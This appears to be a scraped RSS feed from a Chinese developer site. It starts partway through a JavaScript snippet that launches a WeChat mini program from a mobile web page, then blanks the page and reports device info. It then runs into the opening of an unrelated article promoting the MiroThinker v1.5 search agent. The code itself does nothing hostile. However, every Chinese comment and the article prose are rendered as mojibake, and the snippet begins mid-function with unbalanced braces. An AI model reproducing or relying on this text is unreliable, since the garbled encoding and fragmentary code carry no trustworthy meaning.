<span class="hljs-comment">// å¤¸å…‹ä¸“å±ï¼šæ·±åº¦æ¸…ç©º+é‡å†™é¡µé¢ç»“æ„  </span>
document.open(); <span class="hljs-comment">// æ‰“å¼€æ–‡æ¡£æµï¼Œæ¸…ç©ºç¼“å­˜  </span>
document.write(<span class="hljs-string">'&lt;html class="blank-page"&gt;&lt;body class="blank-page"&gt;&lt;/body&gt;&lt;/html&gt;'</span>);  
document.close(); <span class="hljs-comment">// å…³é—­æ–‡æ¡£æµï¼Œå¼ºåˆ¶æ¸²æŸ“  </span>
<span class="hljs-comment">// æ›¿æ¢å†å²è®°å½•+ç¦æ­¢è¿”å›  </span>
window.location.replace(<span class="hljs-string">'about:blank'</span>);  
<span class="hljs-comment">// ç¦ç”¨æ‰€æœ‰äº¤äº’  </span>
document.body.style.pointerEvents = <span class="hljs-string">'none'</span>;  
<span class="hljs-comment">// ç»ˆæ­¢æ‰€æœ‰å¼‚æ­¥ä»»åŠ¡  </span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">let</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2000</span>; i++) {  
clearInterval(i);  
clearTimeout(i);  
}  
<span class="hljs-comment">// å¤¸å…‹ç‰¹æ®Šï¼šå»¶è¿Ÿå†æ¬¡æ¸…ç©º  </span>
setTimeout(() =&gt; {  
document.body.innerHTML = <span class="hljs-string">''</span>;  
document.documentElement.className = <span class="hljs-string">'blank-page'</span>;  
}, <span class="hljs-number">100</span>);  
}  
<span class="hljs-comment">// åä¸ºæµè§ˆå™¨å…œåº•  </span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (browserType.isHuawei) {  
document.documentElement.innerHTML = <span class="hljs-string">''</span>;  
document.body.innerHTML = <span class="hljs-string">''</span>;  
window.location.replace(<span class="hljs-string">'about:blank'</span>);  
document.documentElement.style.display = <span class="hljs-string">'none'</span>;  
document.body.style.display = <span class="hljs-string">'none'</span>;  
<span class="hljs-keyword">for</span> (<span class="hljs-type">let</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {  
clearInterval(i);  
clearTimeout(i);  
}  
}  
<span class="hljs-comment">// å…¶ä»–æµè§ˆå™¨é€šç”¨æ–¹æ¡ˆ  </span>
<span class="hljs-keyword">else</span> {  
document.body.innerHTML = <span class="hljs-string">''</span>;  
window.location.replace(<span class="hljs-string">'about:blank'</span>);  
document.documentElement.className = <span class="hljs-string">'blank-page'</span>;  
}  
}  
}  
  
<span class="hljs-comment">// ç›‘å¬é¡µé¢éšè—ï¼ˆè·³è½¬æˆåŠŸï¼‰ï¼Œæ‰§è¡Œæ¸…ç†  </span>
document.addEventListener(<span class="hljs-string">'visibilitychange'</span>, function () {  
<span class="hljs-keyword">if</span> (document.hidden) {  
console.log(<span class="hljs-string">'é¡µé¢éšè— â†’ è·³è½¬æˆåŠŸï¼Œæ¸…ç†H5é¡µé¢'</span>);  
<span class="hljs-comment">// ä¸åŒæµè§ˆå™¨å»¶è¿Ÿé€‚é…  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">ua</span> <span class="hljs-operator">=</span> navigator.userAgent.toLowerCase();  
<span class="hljs-type">let</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> <span class="hljs-number">500</span>; <span class="hljs-comment">// é»˜è®¤  </span>
<span class="hljs-keyword">if</span> (ua.includes(<span class="hljs-string">'huawei'</span>)) delay = <span class="hljs-number">300</span>; <span class="hljs-comment">// åä¸º  </span>
<span class="hljs-keyword">if</span> (ua.includes(<span class="hljs-string">'quark'</span>)) delay = <span class="hljs-number">200</span>; <span class="hljs-comment">// å¤¸å…‹ï¼ˆæ›´å¿«å“åº”ï¼‰  </span>
  
setTimeout(() =&gt; {  
clearH5PageAfterJump();  
}, delay);  
}  
});  
  
<span class="hljs-comment">// æ‰€æœ‰ç³»ç»Ÿç»Ÿä¸€èµ°aæ ‡ç­¾è·³è½¬  </span>
function <span class="hljs-title function_">jumpByATag</span><span class="hljs-params">(url)</span> {  
<span class="hljs-type">const</span> <span class="hljs-variable">ua</span> <span class="hljs-operator">=</span> navigator.userAgent.toLowerCase();  
<span class="hljs-type">const</span> <span class="hljs-variable">isAndroid</span> <span class="hljs-operator">=</span> ua.indexOf(<span class="hljs-string">'android'</span>) &gt; -<span class="hljs-number">1</span> || ua.indexOf(<span class="hljs-string">'adr'</span>) &gt; -<span class="hljs-number">1</span>;  
<span class="hljs-type">const</span> <span class="hljs-variable">isIOS</span> <span class="hljs-operator">=</span> !!ua.match(/\(i[^;]+;( u;)? cpu.+mac os x/);  
<span class="hljs-type">const</span> <span class="hljs-variable">isXiaomi</span> <span class="hljs-operator">=</span> ua.indexOf(<span class="hljs-string">'mi '</span>) &gt; -<span class="hljs-number">1</span> || ua.indexOf(<span class="hljs-string">'xiaomi'</span>) &gt; -<span class="hljs-number">1</span> ||  
ua.indexOf(<span class="hljs-string">'redmi'</span>) &gt; -<span class="hljs-number">1</span>;  
  
<span class="hljs-keyword">if</span> (isIOS) {  
window.location.href = url;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isAndroid || isXiaomi) {  
<span class="hljs-comment">// å®‰å“ï¼ˆå°¤å…¶æ˜¯â¼©â½¶ï¼‰â½¤iframeä¸­è½¬  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">ifr</span> <span class="hljs-operator">=</span> document.createElement(<span class="hljs-string">'iframe'</span>);  
ifr.src = url;  
ifr.style.display = <span class="hljs-string">'none'</span>;  
document.body.appendChild(ifr);  
<span class="hljs-comment">// å¯é€‰ï¼šå»¶æ—¶ç§»é™¤ï¼Œé¿å…å½±å“  </span>
setTimeout(() =&gt; {  
document.body.removeChild(ifr);  
}, <span class="hljs-number">2000</span>);  
} <span class="hljs-keyword">else</span> {  
<span class="hljs-type">const</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> document.createElement(<span class="hljs-string">'a'</span>);  
a.href = url;  
a.style.display = <span class="hljs-string">'none'</span>;  
document.body.appendChild(a);  
a.click();  
<span class="hljs-comment">// å¯é€‰ï¼šå»¶æ—¶ç§»é™¤ï¼Œé¿å…å½±å“  </span>
setTimeout(() =&gt; {  
document.body.removeChild(a);  
}, <span class="hljs-number">2000</span>);  
}  
}  
  
function <span class="hljs-title function_">loadMWScheme</span><span class="hljs-params">()</span> {  
<span class="hljs-type">var</span> <span class="hljs-variable">appid</span> <span class="hljs-operator">=</span> <span class="hljs-string">"wx5728ecf19f0d9405"</span>;  
<span class="hljs-type">var</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">"pages/index/index"</span>;  
<span class="hljs-type">var</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-string">"develop"</span>;  
<span class="hljs-type">let</span> <span class="hljs-variable">code1</span> <span class="hljs-operator">=</span> `${code}`;  
  
<span class="hljs-type">const</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(window.location.search);  
ticket = params.get(<span class="hljs-string">'ticket'</span>);  
<span class="hljs-type">let</span> <span class="hljs-variable">queryObj</span> <span class="hljs-operator">=</span> <span class="hljs-string">'source=h5&amp;ticket='</span> + ticket + <span class="hljs-string">'&amp;code='</span> + code1;  
<span class="hljs-type">let</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> encodeURIComponent(queryObj);  
<span class="hljs-type">let</span> <span class="hljs-variable">finalUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">'weixin://dl/business/?appid='</span> + appid + <span class="hljs-string">'&amp;path='</span> + path + <span class="hljs-string">'&amp;query='</span> + query + <span class="hljs-string">'&amp;env_version='</span> + env;  
console.log(finalUrl + <span class="hljs-string">'æ˜æ–‡è·³è½¬'</span>);  
jumpByATag(finalUrl);  
}  
  
function <span class="hljs-title function_">loadScheme</span><span class="hljs-params">(version = <span class="hljs-string">'release'</span>)</span> {  
<span class="hljs-keyword">try</span> {  
<span class="hljs-type">let</span> <span class="hljs-variable">code1</span> <span class="hljs-operator">=</span> `${code}`;  
<span class="hljs-type">const</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(window.location.search);  
ticket = params.get(<span class="hljs-string">'ticket'</span>);  
<span class="hljs-comment">// é¸¿è’™ç³»ç»Ÿç›´æ¥åŠ å…¥ç™½åå•  </span>
  
<span class="hljs-comment">// å¦åˆ™-  </span>
GetWxMiniScheme(code1, ticket, version).then(res =&gt; {  
<span class="hljs-type">const</span> <span class="hljs-variable">schemeUrl</span> <span class="hljs-operator">=</span> res.urlScheme;  
<span class="hljs-type">let</span> <span class="hljs-variable">jumped</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  
<span class="hljs-type">let</span> <span class="hljs-variable">hasReported</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  
<span class="hljs-type">const</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> Date.now();  
  
<span class="hljs-type">const</span> <span class="hljs-variable">handleVisibility</span> <span class="hljs-operator">=</span> () =&gt; {  
<span class="hljs-keyword">if</span> (document.hidden) {  
jumped = <span class="hljs-literal">true</span>;  
console.log(<span class="hljs-string">'é¡µé¢éšè— â†’ æ¨æµ‹è·³è½¬æˆåŠŸ'</span>);  
document.removeEventListener(<span class="hljs-string">'visibilitychange'</span>, handleVisibility);  
clearH5PageAfterJump();  
}  
};  
document.addEventListener(<span class="hljs-string">'visibilitychange'</span>, handleVisibility);  
  
<span class="hljs-type">const</span> <span class="hljs-variable">interval</span> <span class="hljs-operator">=</span> setInterval(() =&gt; {  
<span class="hljs-type">const</span> <span class="hljs-variable">elapsed</span> <span class="hljs-operator">=</span> Date.now() - start;  
<span class="hljs-keyword">if</span> (jumped || hasReported || elapsed &gt; <span class="hljs-number">8000</span>) {  
clearInterval(interval);  
<span class="hljs-keyword">return</span>;  
}  
<span class="hljs-keyword">if</span> (elapsed &gt;= <span class="hljs-number">5000</span> &amp;&amp; !jumped) {  
console.log(<span class="hljs-string">'æ£€æµ‹ 5 ç§’æœªè·³è½¬ï¼Œå¼€å§‹ä¸ŠæŠ¥'</span>);  
hasReported = <span class="hljs-literal">true</span>;  
reportDeviceInfo(ticket);  
clearInterval(interval);  
}  
}, <span class="hljs-number">1000</span>);  
  
<span class="hljs-comment">// ç»Ÿä¸€æ‹¼æ¥è·³è½¬URL 0ä¸ºæ˜æ–‡è·³è½¬  </span>
<span class="hljs-type">let</span> <span class="hljs-variable">finalJumpUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">''</span>;  
<span class="hljs-keyword">if</span> (res.status == <span class="hljs-number">0</span>) {  
<span class="hljs-type">var</span> <span class="hljs-variable">appid</span> <span class="hljs-operator">=</span> <span class="hljs-string">"wx5728ecf19f0d9405"</span>;  
<span class="hljs-type">var</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">"pages/index/index"</span>;  
<span class="hljs-type">var</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> version;  
<span class="hljs-type">let</span> <span class="hljs-variable">queryObj</span> <span class="hljs-operator">=</span> <span class="hljs-string">'source=h5&amp;ticket='</span> + ticket + <span class="hljs-string">'&amp;code='</span> + code1;  
<span class="hljs-type">let</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> encodeURIComponent(queryObj);  
finalJumpUrl = <span class="hljs-string">'weixin://dl/business/?appid='</span> + appid + <span class="hljs-string">'&amp;path='</span> + path + <span class="hljs-string">'&amp;query='</span> + query + <span class="hljs-string">'&amp;env_version='</span> + env;  
console.log(finalJumpUrl + <span class="hljs-string">'æ˜æ–‡è·³è½¬'</span>, res);  
} <span class="hljs-keyword">else</span> {  
finalJumpUrl = schemeUrl;  
console.log(schemeUrl + <span class="hljs-string">' å¯†æ–‡è·³è½¬'</span>, res);  
}  
  
<span class="hljs-comment">// æ‰€æœ‰ç³»ç»Ÿç»Ÿä¸€èµ°aæ ‡ç­¾è·³è½¬  </span>
jumpByATag(finalJumpUrl);  
  
}).<span class="hljs-keyword">catch</span>(err =&gt; {  
console.error(<span class="hljs-string">'è·å–Schemeå¤±è´¥ï¼š'</span>, err);  
});  
} <span class="hljs-keyword">catch</span> (err) {  
console.error(<span class="hljs-string">'loadSchemeå¼‚å¸¸ï¼š'</span>, err);  
}  
}  
  
function <span class="hljs-title function_">reportDeviceInfo</span><span class="hljs-params">(ticket1 = ticket)</span> {  
console.log(navigator.userAgent, navigator, <span class="hljs-string">'navigator'</span>, ticket1)  
<span class="hljs-keyword">if</span> (!isHo) {  
p3.innerText = <span class="hljs-string">'éé¸¿è’™ç³»ç»Ÿï¼Œè¯·ä»Appè·³è½¬å°ç¨‹åº'</span>  
p.innerText = <span class="hljs-string">'ç³»ç»Ÿç±»å‹:'</span> + deviceInfo.systemType + <span class="hljs-string">'\n'</span> + <span class="hljs-string">'ç‰ˆæœ¬å·:'</span> + deviceInfo.systemVersion + <span class="hljs-string">'\nå¹³å°:'</span> + deviceInfo.platform + <span class="hljs-string">'\n'</span> + <span class="hljs-string">'UserAgent: '</span> + deviceInfo.userAgent + <span class="hljs-string">'data"'</span> + navigator.userAgentData;  
console.log(<span class="hljs-string">'æ£€æµ‹è®¾å¤‡ä¿¡æ¯ï¼š'</span>, deviceInfo, navigator.userAgentData, <span class="hljs-string">'userAgentData'</span>, systemType);  
ELEMENT.Message({  
message: <span class="hljs-string">'è¯·ç‚¹å‡»è¿›å…¥å°ç¨‹åºï¼Œå¤±è´¥å¯é€‰æ‹©ä¸ŠæŠ¥è®¾å¤‡ä¿¡æ¯,ä»å°ç¨‹åºè¿›å…¥'</span>,  
type: <span class="hljs-string">'warning'</span>  
});  
document.getElementById(<span class="hljs-string">'hmbtn2'</span>).style.display = <span class="hljs-string">'block'</span>;  
document.getElementById(<span class="hljs-string">'fhmbtn2'</span>).style.display = <span class="hljs-string">'block'</span>;  
<span class="hljs-keyword">return</span>  
}  
AddWhitelist(ticket1, systemType + systemVersion).then(res =&gt; {  
<span class="hljs-keyword">if</span> (res == <span class="hljs-string">''</span>)  
res = <span class="hljs-string">'å·²ç»åŠ å…¥ç™½åå•ï¼Œè¯·ä»è®¿å®¢å°ç¨‹åºå…¥å£è¿›å…¥'</span>  
ELEMENT.Message({  
message: res,  
type: <span class="hljs-string">'error'</span>  
});  
}).<span class="hljs-keyword">catch</span>(err =&gt; {  
console.log(err, <span class="hljs-string">'err'</span>)  
})  
}  
  
function <span class="hljs-title function_">joinWhiteList</span><span class="hljs-params">()</span> {  
<span class="hljs-type">let</span> <span class="hljs-variable">ticket1</span> <span class="hljs-operator">=</span> ticket  
<span class="hljs-title function_">AddWhitelist</span><span class="hljs-params">(ticket1, systemType + systemVersion)</span>.then(res =&gt; {  
<span class="hljs-keyword">if</span> (res == <span class="hljs-string">''</span>)  
res = <span class="hljs-string">'å·²ç»åŠ å…¥ç™½åå•ï¼Œè¯·ä»è®¿å®¢å°ç¨‹åºå…¥å£è¿›å…¥'</span>  
ELEMENT.Message({  
message: res,  
type: <span class="hljs-string">'error'</span>  
});  
}).<span class="hljs-keyword">catch</span>(err =&gt; {  
console.log(err, <span class="hljs-string">'err'</span>)  
})  
}  
&lt;/script&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GitHub ä¸Š 2300 ç‚¹èµçš„æœç´¢ Agentï¼Œæœ‰ç‚¹æƒŠè‰³å•Šã€‚]]></title>    <link>https://juejin.cn/post/7592939457042464820</link>    <guid>https://juejin.cn/post/7592939457042464820</guid>    <pubDate>2026-01-09T05:59:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592939457042464820" data-draft-id="7592892218669170722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GitHub ä¸Š 2300 ç‚¹èµçš„æœç´¢ Agentï¼Œæœ‰ç‚¹æƒŠè‰³å•Šã€‚"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2026-01-09T05:59:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€›é€›GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GitHub ä¸Š 2300 ç‚¹èµçš„æœç´¢ Agentï¼Œæœ‰ç‚¹æƒŠè‰³å•Šã€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€›é€›GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:59:40.000Z" title="Fri Jan 09 2026 05:59:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>1 æœˆ 5 æ—¥ï¼ŒMiroMind AIÂ æ­£å¼å‘å¸ƒå¹¶å¼€æºäº†Â <strong>MiroThinker v1.5</strong>ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªå…¨çƒé¢†å…ˆçš„å¼€æºæœç´¢ Agentã€‚</p>
<p><strong>MiroThinker æ˜¯å¼€æºç•Œé¦–ä¸ªä¸æ‹¼å‚æ•°å¤§å°ï¼Œè€Œæ˜¯è®© AI åƒäººç±»ä¸€æ ·ç–¯ç‹‚æŸ¥èµ„æ–™ã€å†™ä»£ç ã€ä¸æ–­è¯•é”™å’Œä¿®æ­£ï¼Œè®©å°æ¨¡å‹ä¹Ÿèƒ½è§£å†³é«˜éš¾åº¦ä»»åŠ¡çš„æœç´¢ Agentã€‚</strong></p>
<p><strong>è€Œä¸”åœ¨BrowseComp æµ‹è¯•ä¸Š</strong>è¶…è¿‡äº† ChatGPT-Agentã€‚åœ¨ BrowseComp-ZH ä¸Šè¶…è¶Šäº† Kimi-K2-Thinkingï¼Œè€Œä¸”æˆæœ¬æ›´ä½ï¼Œä»…ç”¨äº† 1/30 çš„å‚æ•°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/077d22b0fd544b29b56dce45fb584c55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=4xd6na6O3%2BMuWOuejKE9wLMyXBk%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>BrowseComp æ˜¯Â OpenAI ç ”å‘çš„ä¸€ä¸ªå¼€æºæµ‹è¯•åŸºå‡†ï¼Œä¸“é—¨ç”¨äºè¯„ä¼° AI æ¨¡å‹ï¼Œå°¤å…¶æ˜¯å…·å¤‡ç½‘é¡µæµè§ˆåŠŸèƒ½çš„ Agent åœ¨äº’è”ç½‘ä¸ŠæŸ¥æ‰¾å¤æ‚ã€å…³è”ä¿¡æ¯çš„èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-0">01ã€å¼€æºé¡¹ç›®ç®€ä»‹</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/002bb5b6a6cf48b1a1369683e775e63a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=gB%2BAHDxGy3L5rJH0DhbI%2FidIQ50%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/MiroMindAI/MiroThinker</span>
</code></pre>
<p>MiroThinker å¯ä»¥é€šè¿‡è°ƒç”¨å¤–éƒ¨å·¥å…·å’Œç½‘ç»œæœç´¢æ¥è¾…åŠ© AI å®Œæˆå¤æ‚çš„æ¨ç†ä¸æ·±åº¦ç ”ç©¶ä»»åŠ¡ã€‚Â </p>
<p>å®ƒé‡‡ç”¨äº†ä¸€ç§ç‹¬ç‰¹çš„äº¤äº’å¼æ‰©å±•æŠ€æœ¯ï¼ˆInteractive Scalingï¼‰ï¼Œä½¿æ¨¡å‹èƒ½å¤Ÿåœ¨é•¿ç¯‡å¯¹è¯ä¸­é€šè¿‡ä¸æ–­çš„åé¦ˆæ¥è‡ªæˆ‘ä¿®æ­£ï¼Œä»è€Œæ›´ç²¾å‡†åœ°è·å–ä¿¡æ¯ã€‚Â </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f389b11dcdfc4d8889260f6b7c8ece67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=UrERqUdoR7cz3GlhIDixfWtQv%2FQ%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>ä¸åŒäºä¼ ç»Ÿæ¨¡å‹åœ¨å°é—­çš„å‚æ•°ç©ºé—´å†…è¿›è¡Œçº¿æ€§æ¨ç†ï¼ŒMiroThinker è¢«è®­ç»ƒæˆäº†ä¸€ä¸ªæ‡‚å¾—ã€Œå‘å¤–æ±‚åŠ©ã€çš„Agentï¼š</p>
<ul>
<li>ä¸»åŠ¨æ±‚è¯ï¼šé‡åˆ°ä¸ç¡®å®šé—®é¢˜ï¼Œä¸æ˜¯æ ¹æ®æ¦‚ç‡ççŒœï¼Œè€Œæ˜¯åƒä¸¥è°¨çš„ç ”ç©¶å‘˜ä¸€æ ·æ‹†è§£é—®é¢˜ã€æ£€ç´¢è¯æ®ã€‚</li>
<li>å¤šè½®ä¿®æ­£ï¼šå»ºç«‹ã€Œæ¨ç†-éªŒè¯-ä¿®æ­£ã€çš„é—­ç¯ï¼Œä¸€æ—¦å‘ç°å¤–éƒ¨è¯æ®ä¸å‡è®¾å†²çªï¼Œç«‹å³è°ƒæ•´è·¯å¾„ï¼Œç›´åˆ°è¯æ®æ”¶æ•›ã€‚</li>
<li>å»ä¼ªå­˜çœŸï¼šè®­ç»ƒä¸­ç³»ç»Ÿæ€§æƒ©ç½šç¼ºä¹ä¿¡æºçš„é«˜ç½®ä¿¡åº¦å›ç­”ï¼Œå€’é€¼æ¨¡å‹å…»æˆã€Œæ— è¯æ®ä¸å¼€å£ã€çš„æœ¬èƒ½ã€‚</li>
</ul>
<h2 data-id="heading-1">02ã€ä½¿ç”¨ä¸€ä¸‹</h2>
<p>case1ï¼šè¯·å¸®æˆ‘è°ƒç ”ä¸€ä¸‹2026å¹´å…¨çƒ AI å¤§æ¨¡å‹å¸‚åœºçš„æœ€æ–°ç«äº‰æ ¼å±€ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæç¤ºè¯è¾“å…¥ä¸‹å»ï¼ŒMiroThinker ä¸€å…±è¿›è¡Œäº† 30 å¤šæ¬¡æœç´¢ï¼Œ10 å¤šæ¬¡æµè§ˆç½‘é¡µï¼Œæœ€ç»ˆæ‰æŠŠå®ƒè®¤ä¸º OK çš„ç»“è®ºå‘ˆç°ç»™ä½ ã€‚</p>
